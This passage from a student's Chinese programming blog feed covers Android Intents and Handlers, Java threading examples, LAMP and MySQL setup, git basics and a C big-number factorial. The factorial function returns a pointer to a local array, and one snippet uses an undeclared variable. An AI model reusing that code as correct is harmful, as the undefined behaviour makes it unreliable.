pStack-&gt;push('o'); pStack-&gt;stackTraverse(true); char elem = 0; pStack-&gt;pop(elem); pStack-&gt;stackTraverse(true); //pStack-&gt;clearStack(); cout &lt;&lt; pStack-&gt;stackLength() &lt;&lt; endl; if (pStack-&gt;stackEmpty()) &#123; cout &lt;&lt; "栈为空" &lt;&lt; endl; &#125; if (pStack-&gt;stackFull()) &#123; cout &lt;&lt; "栈为满" &lt;&lt; endl; &#125; delete pStack; pStack = NULL; system("pause"); return 0;&#125;]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android在不同Activity之间传输数据]]></title>
    <url>%2F2016%2F06%2F30%2FAndroid%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%2F</url>
    <content type="text"><![CDATA[Android中的数据传输 在Android中有几种层次的数据传输，首先说在同一Activity中的不同线程里面传输使用Handler来实现，具体怎么实现，在我的博客里有。还有就是在不同的Activity中进行数据传输，下面先放代码 MainActivity中的代码 1234567891011121314151617181920212223242526package com.example.administrator.myapplication;import android.content.Intent;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.EditText;public class MainActivity extends AppCompatActivity &#123; private EditText editText; public final static String MESSAGE = "com.example"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; public void sendMessage(View view)&#123; Intent intent = new Intent(this,Main2Activity.class); editText = (EditText)findViewById(R.id.EditTextId); String message = editText.getText().toString(); intent.putExtra(MESSAGE,message); startActivity(intent); &#125;&#125; 首先要定义一个字符标记public final static String MESSAGE = &quot;com.example&quot;; 然后再xml文件中编写Button设置12345678910&lt;Button android:id="@+id/ButtonId" android:layout_width="wrap_content" android:onClick="sendMessage" android:text="send" style="@style/Widget.AppCompat.Button.Colored" android:layout_height="wrap_content" android:layout_below="@+id/EditTextId" android:layout_alignEnd="@+id/EditTextId" android:layout_marginTop="52dp" /&gt; 其中只要看这个设置android:onClick=&quot;sendMessage&quot; 该设置是为Button设置监听器，然后将行为导向sendMessage方法1234567public void sendMessage(View view)&#123; Intent intent = new Intent(this,Main2Activity.class); editText = (EditText)findViewById(R.id.EditTextId); String message = editText.getText().toString(); intent.putExtra(MESSAGE,message); startActivity(intent); &#125; 在sendMessage方法里面只要是定义意图对象Intent来导向另外一个Activity，最后startActivity(intent)启动，其中用于将数据传输的介质是Extra-Message，主要方法是intent.putExtra(),然后在另一个Activity中得到该数据，使用方法String message = intent.getStringExtra(MainActivity.MESSAGE); 另一个Activity中的代码12345678910111213141516171819202122package com.example.administrator.myapplication;import android.content.Intent;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.widget.EditText;import android.widget.TextView;public class Main2Activity extends AppCompatActivity &#123; private TextView textView; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main2); textView = (TextView)findViewById(R.id.TextView2Id); Intent intent = getIntent(); String message = intent.getStringExtra(MainActivity.MESSAGE); textView.setText(message); &#125;&#125; 同时要留意这行代码Intent intent = getIntent(); 具体怎么个传输步骤还得多看代码，一直看，看到懂为止]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android数据传输</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[教训]]></title>
    <url>%2F2016%2F06%2F27%2Ftest%2F</url>
    <content type="text"><![CDATA[昨天在百度上下了软件，结果有问题，然后重置电脑，然后后悔了，这个博文只是一个测试。。。]]></content>
  </entry>
  <entry>
    <title><![CDATA[再次挖坑]]></title>
    <url>%2F2016%2F06%2F20%2F%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[爬虫今天看了寝室大神的博客，看他写了一个爬虫，我不禁想去学一下，虽然之前的服务器坑没填，但爬虫更吸引我，所以在此挖坑。。。。。 已经填了一部分坑，具体在项目中使用过，为了写数据库的大作业——旅游预订系统，需要航班等信息，因此直接从网上把数据爬下来。 项目地址https://github.com/fenlan/Mycode/tree/master/reser_system]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java线程学习记录]]></title>
    <url>%2F2016%2F06%2F18%2Fjava-Thread%2F</url>
    <content type="text"><![CDATA[在接触Android时候发现java基础没打好，所以回来重新打基础 java线程基础 java线程是在一个程序代码中CPU同步运行多个程序片段，而不是一行代码一行代码地执行到底，这样做是为了在运行大程序时提高程序的运行效率。虽然说的是同步运行，其实是“微观串行，宏观并行”，只是线程之间的切换时间太短以至于我们看上去是并行的。另外线程的调度模式有 （1）分时模型 （2）抢占模型java用的是抢占模型，其他知识以后再补充，现在放代码 重要提示：以下的代码的运行结果可能并不能代表多线程真正的运行顺序，因为本身线程运行时输出信号到显示器这段时间也是不可预计的，所以显示器上的显示顺序不完全代表运行代码时间先后。这个问题叫做显示调度器不可预测 1. 继承Thread类，重写run函数12345678910111213141516171819202122232425class ThreadTest &#123; public static void main (String[] args)&#123; MyThread thread1 = new MyThread("thread1"); MyThread thread2 = new MyThread("thread2"); thread1.start(); thread2.start(); System.out.println("The main runnnig is stopped"); &#125;&#125;class MyThread extends Thread &#123; public MyThread(String str)&#123; super(str); &#125; public void run()&#123; for (int i=0;i&lt;3;i++)&#123; System.out.println(getName() + "is running"); try &#123; sleep(100); &#125; catch (InterruptedException e) &#123;&#125; &#125; System.out.println(getName() + "stopped"); &#125;&#125; 运行结果如下123456789The main runnnig is stoppedthread2is runningthread1is runningthread1is runningthread2is runningthread1is runningthread2is runningthread2stoppedthread1stopped 2. 实现Runable接口 12345678910111213141516171819202122232425262728class TestSync implements Runnable &#123; private int balance; @Override public void run() &#123; for(int i = 0; i &lt; 50; i++) &#123; increament(); System.out.println("balance is " + balance); &#125; &#125; private void increament() &#123; int i = balance; balance = i + 1; &#125;&#125;public class TestSyncTest &#123; public static void main(String[] args) &#123; TestSync job = new TestSync(); Thread a = new Thread(job); Thread b = new Thread(job); a.start(); b.start(); &#125;&#125; 线程调度函数及代码实例 sleep(long millis) : 在指定的毫秒数内让当前正在执行的线程休眠（暂停执行） join() : 在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。 123456789101112131415161718192021222324252627class MyThread extends Thread &#123; public MyThread(String name) &#123; super(name); &#125; public void run() &#123; int result = 0; System.out.println(this.getName() + "thread is started!"); for (int i = 0; i &lt; 50; i++ ) &#123; result += i; &#125; System.out.println(this.getName() + "thread is stopped!"); &#125;&#125;public class ThreadTest &#123; public static void main(String[] args) throws InterruptedException &#123; System.out.println("Main thread is started!"); MyThread a = new MyThread("A"); a.start(); a.join(); System.out.println("Main thread is stopped!"); &#125;&#125; 输出结果:1234Main thread is started!Athread is started!Athread is stopped!Main thread is stopped! yield() : 运行–&gt;可运行,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。 123456789101112131415161718192021222324252627282930class MyThread extends Thread&#123; public void run() &#123; for (int i=0; i&lt;5 ; i++) System.out.println(Thread.currentThread().getName() + " in control"); &#125;&#125;// Driver Classpublic class ThreadTest&#123; public static void main(String[]args) &#123; MyThread t = new MyThread(); t.start(); for (int i=0; i&lt;5; i++) &#123; // Control passes to child thread Thread.yield(); // After execution of child Thread // main thread takes over System.out.println(Thread.currentThread().getName() + " in control"); &#125; &#125;&#125; 可能的情况： main运行时让掉CPU，过后main抢到CPU继续执行 main运行时让掉CPU，过后子线程抢到CPU继续执行 所以输出可能是12345678910Thread-0 in controlmain in controlmain in controlmain in controlmain in controlmain in controlThread-0 in controlThread-0 in controlThread-0 in controlThread-0 in control 也可能是12345678910Thread-0 in controlThread-0 in controlThread-0 in controlThread-0 in controlThread-0 in controlmain in controlmain in controlmain in controlmain in controlmain in control 生产者消费者1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import java.util.LinkedList;import java.util.Queue;import java.util.Random;public class ProducerCustomer &#123; public static void main(String args[]) &#123; System.out.println("Solving Producer Consumper Problem"); Queue&lt;Integer&gt; buffer = new LinkedList&lt;&gt;(); int maxSize = 10; Thread producer = new Producer(buffer, maxSize, "PRODUCER"); Thread consumer = new Consumer(buffer, maxSize, "CONSUMER"); producer.start(); consumer.start(); &#125;&#125;class Producer extends Thread &#123; private Queue&lt;Integer&gt; queue; private int maxSize; public Producer(Queue&lt;Integer&gt; queue, int maxSize, String name) &#123; super(name); this.queue = queue; this.maxSize = maxSize; &#125; @Override public void run() &#123; while (true) &#123; synchronized (queue) &#123; while (queue.size() == maxSize) &#123; try &#123; System.out .println("Queue is full, " + "Producer thread waiting for " + "consumer to take something from queue"); queue.wait(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; Random random = new Random(); int i = random.nextInt(); System.out.println("Producing value : " + i); queue.add(i); queue.notifyAll(); &#125; &#125; &#125;&#125;class Consumer extends Thread &#123; private Queue&lt;Integer&gt; queue; private int maxSize; public Consumer(Queue&lt;Integer&gt; queue, int maxSize, String name)&#123; super(name); this.queue = queue; this.maxSize = maxSize; &#125; @Override public void run() &#123; while (true) &#123; synchronized (queue) &#123; while (queue.isEmpty()) &#123; System.out.println("Queue is empty," + "Consumer thread is waiting" + " for producer thread to put something in queue"); try &#123; queue.wait(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; System.out.println("Consuming value : " + queue.remove()); queue.notifyAll(); &#125; &#125; &#125;&#125; ABC交替打印synchronized方式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class ABC_Synch &#123; public static class ThreadPrinter implements Runnable &#123; private String name; private Object prev; private Object self; private ThreadPrinter(String name, Object prev, Object self) &#123; this.name = name; this.prev = prev; this.self = self; &#125; @Override public void run() &#123; int count = 10; while (count &gt; 0) &#123;// 多线程并发，不能用if，必须使用whil循环 synchronized (prev) &#123; // 先获取 prev 锁 synchronized (self) &#123;// 再获取 self 锁 System.out.print(name);// 打印 count--; self.notifyAll();// 唤醒其他线程竞争self锁，注意此时self锁并未立即释放。 &#125; // 此时执行完self的同步块，这时self锁才释放。 try &#123; if (count == 0) &#123;// 如果count==0,表示这是最后一次打印操作，通过notifyAll操作释放对象锁。 prev.notifyAll(); &#125; else &#123; prev.wait(); // 立即释放 prev锁，当前线程休眠，等待唤醒 &#125; &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; public static void main(String[] args) throws Exception &#123; Object a = new Object(); Object b = new Object(); Object c = new Object(); ThreadPrinter pa = new ThreadPrinter("A", c, a); ThreadPrinter pb = new ThreadPrinter("B", a, b); ThreadPrinter pc = new ThreadPrinter("C", b, c); new Thread(pa).start(); Thread.sleep(10);// 保证初始ABC的启动顺序 new Thread(pb).start(); Thread.sleep(10); new Thread(pc).start(); Thread.sleep(10); &#125;&#125; 由交替打印代码可以得出wait()和notify()的区别 wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。 当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。 当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。 notify/notifyAll()执行后，并不立即释放锁，而是要等到执行完临界区中代码后，再释放。 lock方式12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import java.util.concurrent.locks.Lock;import java.util.concurrent.locks.ReentrantLock;public class ABC_Lock &#123; private static Lock lock = new ReentrantLock(); private static int state = 0; static class ThreadA extends Thread &#123; @Override public void run() &#123; for (int i = 0; i &lt; 10; ) &#123; try &#123; lock.lock(); while (state % 3 == 0) &#123; System.out.print("A"); state++; i++; &#125; &#125; finally &#123; lock.unlock(); // 必须放在finally中 &#125; &#125; &#125; &#125; static class ThreadB extends Thread &#123; @Override public void run() &#123; for (int i = 0; i &lt; 10; ) &#123; try &#123; lock.lock(); while (state % 3 == 1) &#123; System.out.print("B"); state++; i++; &#125; &#125; finally &#123; lock.unlock(); &#125; &#125; &#125; &#125; static class ThreadC extends Thread &#123; @Override public void run() &#123; for (int i = 0; i &lt; 10; ) &#123; try &#123; lock.lock(); while (state % 3 == 2) &#123; System.out.print("C"); state++; i++; &#125; &#125; finally &#123; lock.unlock(); &#125; &#125; &#125; &#125; public static void main(String[] args) &#123; new ThreadA().start(); new ThreadB().start(); new ThreadC().start(); &#125;&#125; synchronized 和 lock的区别 synchronized : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。 lock(ReentrantLock) : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。 我们写同步的时候，优先考虑synchronized，如果有特殊需要，再进一步优化。ReentrantLock如果用的不好，不仅不能提高性能，还可能带来灾难。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Handler学习记录]]></title>
    <url>%2F2016%2F06%2F17%2Fandroid-handler%2F</url>
    <content type="text"><![CDATA[这个需要学习三节课程，这是第一节，多的不说，直接放代码 第一节课程1234567891011121314151617181920212223242526272829303132333435363738394041package com.example.administrator.handler;import android.os.Handler;import android.os.Message;import android.provider.Settings;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;public class MainActivity extends AppCompatActivity &#123; private Button button; private Handler handler; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); button = (Button)findViewById(R.id.Button); button.setOnClickListener(new ButtonListener()); handler = new FirstHandler(); &#125; class ButtonListener implements View.OnClickListener&#123; @Override public void onClick(View view)&#123; Message message = handler.obtainMessage(); message.what = 2; handler.sendMessage(message); &#125; &#125; class FirstHandler extends Handler&#123; @Override public void handleMessage(Message message)&#123; int what = message.what; System.out.println("what = " + what); &#125; &#125;&#125; 附上参考地址https://developer.android.com/reference/android/os/Handler.html 怎么说呢，上一节课程的代码其实我自己运行失败，主要是java基础还是没过关，不管怎样，先学完了再回头来看是怎么回事，今天来记录第二节课的学习笔记 第二节课程主要内容 通过Handler实现线程间通信 在主线程中实现Handler和handleMessage（）方法 在Worker Thread当中通过Handler发送消息 今天学得什么我也不太清楚，大概是讲一个worker线程如何通过handler来改变main线程里面的东西，多说不如直接放代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package com.example.administrator.handler2;import android.os.Handler;import android.os.Message;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; private Button button; private TextView textView; private Handler handler; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); button = (Button)findViewById(R.id.ButtonId); textView = (TextView)findViewById(R.id.TextViewId); handler = new MyHandler(); button.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Thread thread = new NetWorkThread(); thread.start(); &#125; &#125;); &#125; class MyHandler extends Handler &#123; @Override public void handleMessage(Message msg)&#123; String s = (String)msg.obj; textView.setText(s); &#125; &#125; class NetWorkThread extends Thread&#123; @Override public void run()&#123; try &#123; Thread.sleep(2 * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; String s = "your app is working!"; Message msg = handler.obtainMessage(); msg.obj = s; handler.sendMessage(msg); &#125; &#125;&#125; 这次运行成功了 第三节课程记录之前有个小插曲，之前那个网站的视频到第二节课程就没有了，害得我到处找才找到 今天主要内容 准备Looper对象 在workerThread当中生成Handler对象 在MainThread当中发送消息 先放代码再说问题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.example.administrator.handler3;import android.os.Handler;import android.os.Looper;import android.os.Message;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; private Button button; private Handler handler; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); button = (Button)findViewById(R.id.ButtonId); button.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Message msg = handler.obtainMessage(); String s = "your app is working!"; msg.obj = s; handler.sendMessage(msg); &#125; &#125;); Thread thread = new MyThread(); thread.start(); &#125; class MyThread extends Thread&#123; public void run()&#123; Looper.prepare(); handler = new Handler()&#123; public void handleMessage(Message msg) &#123; String s = (String)msg.obj; &#125; &#125;; Looper.loop(); &#125; &#125;&#125; 写代码时我将button监听器里面的内容设置成了启动线程，然后再button后面设置handler，结果不能运行，难道是因为那样运行到另外一个线程的时候发现handler还没有设置好。或许是吧，没时间想了，已经一点了，代码发布了就睡]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android Handler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[android中ProgressBar和线程学习记录]]></title>
    <url>%2F2016%2F06%2F17%2Fandroid-ProgressBarAndThread%2F</url>
    <content type="text"><![CDATA[感觉没什么说的，就直接放代码吧 代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.example.administrator.prograssbarandthread;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.ProgressBar;public class MainActivity extends AppCompatActivity &#123; private Button button; private ProgressBar progressBar; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); button = (Button)findViewById(R.id.Button); progressBar = (ProgressBar)findViewById(R.id.ProgressBar); button.setOnClickListener(new ButtonListener()); &#125; class ButtonListener implements View.OnClickListener&#123; @Override public void onClick(View view)&#123; MyThread thread = new MyThread(); thread.start(); &#125; &#125; class MyThread extends Thread&#123; @Override public void run()&#123; for (int i=0;i&lt;=100;i++)&#123; try &#123; Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; progressBar.setProgress(progressBar.getProgress() + 1); &#125; &#125; &#125;&#125; 不过关于ProgressBar的具体使用在下面地址里有https://developer.android.com/reference/android/widget/ProgressBar.html]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>线程</tag>
        <tag>Android</tag>
        <tag>ProgressBar</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Intent对象使用]]></title>
    <url>%2F2016%2F06%2F17%2Fandroid-Intent%2F</url>
    <content type="text"><![CDATA[使用Intent对象专递数据 在Activity之间可以通过Intent对象传递数据 使用putExtra()系列方法向Intent对象当中储存数据 使用getXXXExtra()系列方法从Intent对象当中取出数据 来个实例吧这是第一个Activity代码 12345678910111213141516171819202122232425262728293031323334package com.example.administrator.activitytest;import android.content.DialogInterface;import android.content.Intent;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;public class MainActivity extends AppCompatActivity &#123; private Button button; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); button = (Button) findViewById(R.id.button); button.setOnClickListener(new ButtonListener()); &#125; class ButtonListener implements View.OnClickListener&#123; @Override public void onClick(View v)&#123; Intent intent = new Intent(); intent.setClass(MainActivity.this,Main2Activity.class); EditText editText = (EditText)findViewById(R.id.editText); String name = editText.getText().toString(); intent.putExtra("com.example.administrator.activitytest.Name",name); startActivity(intent); &#125; &#125;&#125; 这是第二个Activity代码123456789101112131415161718192021package com.example.administrator.activitytest;import android.content.Intent;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.widget.TextView;public class Main2Activity extends MainActivity &#123; private TextView textView; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main2); Intent intent = getIntent(); String name = intent.getStringExtra("com.example.administrator.activitytest.Name"); textView = (TextView)findViewById(R.id.textView); textView.setText(name); &#125;&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android Intent</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[android生命周期函数记录]]></title>
    <url>%2F2016%2F06%2F16%2Fandroid-activity%2F</url>
    <content type="text"><![CDATA[函数及解释如下1234567onCreate 在activity对象被第一次创建时调用onStart 在activity变得可见时调用该函数onResume 在activity开始准备与用户交互时调用该方法onPause 当系统即将启动另外一个activity之前调用该方法onStop 当前activity变得不可见时调用该方法onDestroy 当前activity被销毁之前将会调用该方法onRestroy 当一个activity再次启动之前将会调用该方法 来张图片帮助理解 提供java源代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.example.activitytest;import android.app.Activity;import android.content.Intent;import android.os.Bundle;import android.util.Log;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;public class MainActivity extends Activity &#123; private Button btn; private static final String TAG = "ActivityTest"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); Log.d(TAG, "MainActivity onCreate"); setContentView(R.layout.activity_main); btn = (Button)findViewById(R.id.btn); btn.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent intent = new Intent(MainActivity.this,SecondActivity.class); startActivity(intent); &#125; &#125;); &#125; @Override protected void onPause() &#123; Log.d(TAG, "MainActivity onPause "); super.onPause(); &#125; @Override protected void onResume() &#123; Log.d(TAG, "MainActivity onResume "); super.onResume(); &#125; @Override protected void onStart() &#123; super.onStart(); Log.d(TAG,"MainActivity onStart "); &#125; @Override protected void onStop() &#123; super.onStop(); Log.d(TAG, "MainActivity onStop "); &#125; @Override protected void onDestroy() &#123; super.onDestroy(); Log.d(TAG, "MainActivity onDestroy "); &#125; @Override protected void onRestart() &#123; super.onRestart(); Log.d(TAG, "MainActivity onRestart "); &#125;&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android生命周期</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器折腾中。。。]]></title>
    <url>%2F2016%2F06%2F13%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[安装需要安装apahce2,php5,mysql,命令： 123$sudo apt-get install apache2$sudo apt-get install php5$sudo apt-get install mysql 使用记录apache2重启命令等123$/etc/init.d/apache2 restart$/etc/init.d/apache2 start$/etc/init.d/apache2 stop mysql命令记录说之前我得记录一下，像我这种菜鸟，还是得用图形界面习惯一点，纯命令太难了，所以记录一下mysql的可视化软件sqlyog MySQL管理启动MySQL1sudo service mysql start 1.创建新数据库1create database xscj; 2.查看数据库1show databases; 3.选择数据库1use xscj; 4.创建表12345create table student(number varchar(6) NOT NULL,name varchar(10) NOT NULL,sex tinyint NOT NULL,birthday date); 5.查看表结构1describe student; 6.修改表1alter table student add(xuefen int default 0, beizhu text NULL); 7.插入记录1insert into student values(&apos;1513011&apos;,&apos;gaojie&apos;,1,cast(&apos;19961111&apos;as date),0,&apos;&apos;); :注释一下，cast(exp as type)为类型转换函数 检验是否插入成功1select * from student; 服务器配置更新内容更新时间：2016年11月20日鉴于之前单个下载LAMP，然后又要各种配置和模块加载，很复杂而且我一直没配置成功，最后走了一条偏激的道路。直接一条命令将所有的下载完成，并且自动将所有都配置好。详细内容 域名和虚拟主机更新时间：2016年11月24日一直想要一个自己的域名和自己的虚拟主机，在昨天突发奇想去了godadday逛了一下看有没有合适的域名，很庆幸我捡到了一个一年8块钱的域名，不知道为什么那么便宜，总之就是8块钱买了一个属于自己的域名： .在godadday上注册一个账号，然后筛选一个你觉得合适的域名下订单。 进入自己的控制台了解一下基本情况. 域名可以绑定自己配置的服务器，也可以在网上购买一个虚拟主机，通过配置域名的DNS、host names和Nameservers将域名绑定到指定的主机 下载一个ftp软件，通过ftp软件来管理自己的虚拟主机，推荐软件FileZilla 推荐虚拟主机购买网址hostinger(英国)，可获得免费的虚拟主机一年godadday购买域名，个人感觉比万网要划算hostinger购买虚拟主机，有免费的空间哦]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>lnmp</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[拖更。。。。。]]></title>
    <url>%2F2016%2F05%2F30%2F%E6%8B%96%E6%9B%B4%2F</url>
    <content type="text"><![CDATA[最近游手好闲，又开始浪了，感觉最近没什么时间啊，主要是课程脱节了，马上又要期末考试了，所以可能要托更一段时间。下一步可能要搭建自己的服务器，嗯嗯，是这样，不过具体什么时候开始，不知道，先挖个坑把，慢慢填]]></content>
  </entry>
  <entry>
    <title><![CDATA[git to gihub]]></title>
    <url>%2F2016%2F05%2F26%2Fgit-to-github%2F</url>
    <content type="text"><![CDATA[我想想，这个东西好像是上个学期寝室大神告诉我的，然而我现在才知道怎么使用它，主要是之前没接触到这个东西，不知道这东西是干嘛用的，在建blog时接触到了，对于如此难堪的水平的我来说有必要记录一下。想想感觉不应该写在blog上，觉得好好的博客怎么写这些东西了，不过尽管如此，我还是决心写一下 注册github账号这个步骤省略。。。。。 新建repositories继续省略。。。。。。 本地配置最好新建一个目录，比如Mycode，然后将你要放在github的代码放在这个目录中如果第一次用git，需要表明你的身份，我的理解是这样的，命令行如下： 123$ git config --global user.name "yourname"$ git config --global user.email "youremail"$ git config --global color.ui auto 然后继续： 1234567891011$ cd Mycode$ git init$ git status$ git add 要放在github的文件$ git status$ git commit -m "c-program"$ git status$ git log$ git remote add origin https://......$ git push -u origin master$ git push -u origin 附加一些其他的 123$ git clone https://......$ git pull origin master$ git log 差不多就这些 最近更新：同步远程仓库更新本地仓库命令1$ git pull]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算两个大数乘积巧算法]]></title>
    <url>%2F2016%2F05%2F25%2FJieCheng%2F</url>
    <content type="text"><![CDATA[最近遇到了一个编程上的小问题，编程题目是这样的，计算一个数的阶乘，我当时就在想，这不是很简单吗，然后我随手写了串代码，如下 12345678double Jie_Cheng(int i)&#123; double the_output_number = 1; int j = 1; for (j=1;j&lt;=i;j++) the_output_number *= j; return the_output_number;&#125; 但是有人提醒我这串代码在有些编译器中只能算1-13的阶乘，我就意思到这样的代码会有溢出数据范围，然后自己想了些法子去实现，然后又去网上找别人写的代码，看了一些不太好的代码，代码多又复杂，所以没兴趣看，然后突然找到了如下代码，我认真地看着 1234567891011121314151617181920const int max = 3000;int f[max] = &#123;0&#125;;int main ()&#123; int i, j, number; scanf("%d",&amp;number); f[0] = 1; for (i=2;i&lt;=n;i++) &#123; int left = 0; //下面要用的余数 for (j=0;j&lt;max;j++) &#123; int sum = f[j] * i + left; //一个数乘以另一个数的每一项 f[j] = sum % 10; left = sum / 10; &#125; &#125;&#125; 大概代码就是这些，代码本身不难看懂，只是这个实现的方法是我没有想过的。这个算法设计很巧，所以有必要记录一下 代码翻译成计算过程如下，举个乘积例子：1213 * 325，自己动手计算一下，我的老实计算步骤是这样的： 12345678 1213 * 325------------ 6065 2426 3639------------ 394225 那么代码怎么实现这两个数的计算的呢？首先用5 1213 然后将最后一位的5落下来，将剩下的 606 加在第二次用 2 1213 的结果上，再将6落下来，同样的道理一直到计算完。这是从计算本身的角度去设计代码，简单易懂，也便于设计代码，那么再大的数也可以实现阶乘计算了，所以最后完成的代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//本程序有待完善# include &lt;stdio.h&gt;# include &lt;stdlib.h&gt;int * JieCheng (int );/*计算大数阶乘 *输出为数组（指针） *断点为f[i] = 10,使用该函数时可定义一个指针指向该函数返回值， *如函数返回值：5370923 10，最后10为断点 *注：该函数灵活度很差，有待改善 */int main ()&#123; int number = 0; int * g; while (1) &#123; printf("Please input a integer no more than 1000\n"); scanf("%d", &amp;number); printf("The result is:"); g = JieCheng(number); for (;(*g)!=10;g++) printf("%d",*g); printf("\n"); &#125; system("pause"); return 0;&#125;int * JieCheng (int number)&#123; int f[3000] = &#123;0&#125;; //待完善 int i, j; f[0] = 1; for (i=1;i&lt;=number;i++) //迭代求阶乘，从1到所求数 &#123; int left = 0; for (j=0;j&lt;3000;j++) //数组表示所求阶乘大数的每一分数位，如个位是f[0],十位是f[1] &#123; int sum = f[j] * i + left; //具体求法在博客上 f[j] = sum % 10; left = sum / 10; &#125; &#125; for (i=3000-1;;i--) if (f[i]!=0) break; for (j=0;j&lt;i/2+1;j++) &#123; int a = 0; a = f[j]; //将数组倒置 f[j] = f[i-j]; f[i-j] = a; &#125; f[i+1] = 10; //设置断点，使用时以此终止输出 return f;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[通过留言板的添加所得到的想法]]></title>
    <url>%2F2016%2F05%2F24%2Fguestbook%2F</url>
